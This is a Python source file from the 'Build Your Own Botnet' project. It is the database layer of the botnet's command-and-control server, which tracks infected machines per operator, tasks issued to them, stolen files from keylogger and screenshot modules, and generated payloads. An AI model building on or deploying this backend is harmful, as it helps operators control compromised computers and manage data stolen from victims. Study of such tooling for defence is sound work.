#!/usr/bin/python
# -*- coding: utf-8 -*-
'DAO (Build Your Own Botnet)'

# standard library
import os
import json
import math
import hashlib
import collections
from datetime import datetime

from flask_login import login_user, logout_user, current_user, login_required

# modules
from buildyourownbotnet import app, db
from buildyourownbotnet.models import User, Session, Task, Payload, ExfiltratedFile
from buildyourownbotnet.modules import util


class UserDAO:
    def __init__(self, model):
        self.model = model
    
    def get_user(self, user_id=None, username=None):
        if user_id:
            return db.session.query(self.model).get(user_id)
        elif username:
            return db.session.query(self.model).filter_by(username=username).first()
        return None

    def add_user(self, username, hashed_password):
        """
        Add user to database.

        `Required`
        :param str username:        username
        :param str hashed_password: bcrypt hashed password
        """
        user = User(username=username, password=hashed_password)
        db.session.add(user)
        db.session.commit()


class SessionDAO:
    def __init__(self, model, user_dao):
        self.model = model
        self.user_dao = user_dao

    def get_session(self, session_uid):
        """Get session metadata from database."""
        return db.session.query(self.model).filter_by(uid=session_uid).first()

    def get_user_sessions(self, user_id, verbose=False):
        """
        Fetch sessions from database

        `Required`
        :param int user_id:     User ID

        `Optional`
        :param bool verbose:    include full session information

        Returns list of sessions for the specified user.
        """
        user = self.user_dao.get_user(user_id=user_id)
        if user:
            return user.sessions
        return []

    def get_user_sessions_new(self, user_id):
        """
        Get new sessions and update 'new' to False.

        `Required`
        :param int user_id:     User ID
        """
        user = self.user_dao.get_user(user_id=user_id)
        new_sessions = []
        if user:
            sessions = user.sessions
            for s in sessions:
                if s.new:
                    s.new = False
                    new_sessions.append(s)
        db.session.commit()
        return new_sessions

    def handle_session(self, session_dict):
        """
        Handle a new/current client by adding/updating database

        `Required`
        :param dict session_dict:    session host machine session_dictrmation

        Returns the session information as a dictionary.
        """
        if not session_dict.get('uid'):
            # use unique hash of session characteristics to identify machine if possible
            identity = str(session_dict['public_ip'] + session_dict['mac_address'] + session_dict['owner']).encode()
            session_dict['uid'] = hashlib.md5(identity).hexdigest()
            session_dict['joined'] = datetime.utcnow()

        # udpdate session status to online
        session_dict['online'] = 1
        session_dict['last_online'] = datetime.utcnow()

        # check if session metadata already exists in database
        session = self.get_session(session_dict['uid'])

        # if session for this machine not found, assign this machine to the listed owner 
        if not session:
            user = self.user_dao.get_user(username=session_dict['owner'])
            if user:
                sessions = user.sessions

                # increment session id if necessary (TODO: db autoincrement?)
                if sessions:
                    session_dict['id'] = 1 + max([s.id for s in sessions])
                else:
                    session_dict['id'] = 1

                session = Session(**session_dict)
                db.session.add(session)
                user.bots += 1
                db.session.commit()

            else:
                # if user doesn't exist don't add anything
                util.log("User not found: " + session_dict['owner'])
        else:
            # if session metadata found, set session status to online
            session.online = True
            session.last_online = datetime.utcnow()
            db.session.commit()

        if session:
            session.new = True
            session_dict['id'] = session.id
            db.session.commit()

        return session_dict

    def update_session_status(self, session_uid, status):
        """
        Update online/offline status of the specified session.

        `Required`
        :param int session_id:      Session UID
        :param bool status:         True (online), False (offline)
        """
        session = db.session.query(self.model).filter_by(uid=session_uid).first()
        if session:
            session.online = bool(status)
            db.session.commit()


class TaskDAO:
    def __init__(self, model, session_dao):
        self.model = model
        self.session_dao = session_dao

    def get_task(self, task_uid):
        """Get task metadata from database."""
        return db.session.query(self.model).filter_by(uid=task_uid).first()

    def get_session_tasks(self, session_uid):
        """
        Fetch tasks from databse for specified session.

        `Optional`
        :param int session_id:  Session ID 
        """
        session = session_dao.get_session(session_uid)
        if session:
            return session.tasks
        return []

    def get_tasks_paginated(self, session_id, page=1):
        """
        Fetch tasks from database  for specified session (paginated).

        `Optional`
        :param int session_id:  Session ID 

        Returns list of tasks for the specified session, and total pages of tasks.
        """
        session = db.session.query(self.model).filter_by(id=session_id).first()
        if session:
            tasks = session.tasks
            # janky manual pagination
            pages = int(math.ceil(float(len(tasks))/20.0))
            blocks = [i for i in range(0, len(tasks), 20)]
            if (page - 1 >= 0) and (page + 1 <= len(blocks)):
                start, end = blocks[page - 1:page + 1]
                if (start >= 0) and (end <= len(tasks)):
                    return tasks[start:end], pages
        return [], 0

    def handle_task(self, task_dict):
        """
        Adds issued tasks to the database and updates completed tasks with results

        `Task`
        :attr str session:         associated session UID 
        :attr str task:            task assigned by server
        :attr str uid:             task ID assigned by server
        :attr str result:          task result completed by client
        :attr datetime issued:     time task was issued by server
        :attr datetime completed:  time task was completed by client

        Returns task information as a dictionary.

        """
        if not isinstance(task_dict, dict):
            task_dict = {'result': 'Error: client returned invalid response: "{}"'.format(str(task_dict))}
            return task_dict
        if not task_dict.get('uid'):
            identity = str(str(task_dict.get('session')) + str(task_dict.get('task')) + datetime.utcnow().__str__()).encode()
            task_dict['uid'] = hashlib.md5(identity).hexdigest()
            task_dict['issued'] = datetime.utcnow()
            task = Task(**task_dict)
            db.session.add(task)
            # encode datetime object as string so it will be JSON serializable
            task_dict['issued'] = task_dict.get('issued').__str__()
        else:
            task = self.get_task(task_dict.get('uid'))
            if task:
                task.result = task_dict.get('result')
                task.completed = datetime.utcnow()
        db.session.commit()
        return task_dict


class FileDAO:
    def __init__(self, model, user_dao):
        self.model = model
        self.user_dao = user_dao

    def add_user_file(self, owner, filename, session, module):
        """
        Add newly exfiltrated file to database.

        `Required`
        :param int user_id:         user ID
        :param str filename:        filename
        :param str session:         public IP of session
        :param str module:          module name (keylogger, screenshot, upload, etc.)
        """
        user = self.user_dao.get_user(username=owner)
        if user:
            exfiltrated_file = ExfiltratedFile(filename=filename,
                                            session=session,
                                            module=module,
                                            owner=user.username)
            db.session.add(exfiltrated_file)
            db.session.commit()
            return exfiltrated_file

    def get_user_files(self, user_id):
        """
        Get a list of files exfiltrated by the user.

        `Required`
        :param int user_id:         user ID
        """
        user = self.user_dao.get_user(user_id=user_id)
        if user:  
            return user.files
        return []


class PayloadDAO:
    def __init__(self, model, user_dao):
        self.model = model
        self.user_dao = user_dao 

    def get_user_payloads(self, user_id):
        """
        Get a list of the user's payloads.

        `Required`
        :param int user_id:         user ID
        """
        user = self.user_dao.get_user(user_id=user_id)
        if user:
            return user.payloads
        return []

    def add_user_payload(self, user_id, filename, operating_system, architecture):
        """
        Add newly generated user payload to database.

        `Required`
        :param int user_id:             user ID
        :param str filename:            filename
        :param str operating_system:    nix, win, mac
        :param str architecture:        x32, x64, arm64v8/debian, arm32v7/debian, i386/debian
        """
        user = self.user_dao.get_user(user_id=user_id)
        if user:
            payload = Payload(filename=filename, 
                            operating_system=operating_system,
                            architecture=architecture,
                            owner=user.username)
            db.session.add(payload)
            db.session.commit()
            return payload

user_dao = UserDAO(User)
session_dao = SessionDAO(Session, user_dao)
task_dao = TaskDAO(Task, session_dao)
payload_dao = PayloadDAO(Payload, user_dao)
file_dao = FileDAO(ExfiltratedFile, user_dao)
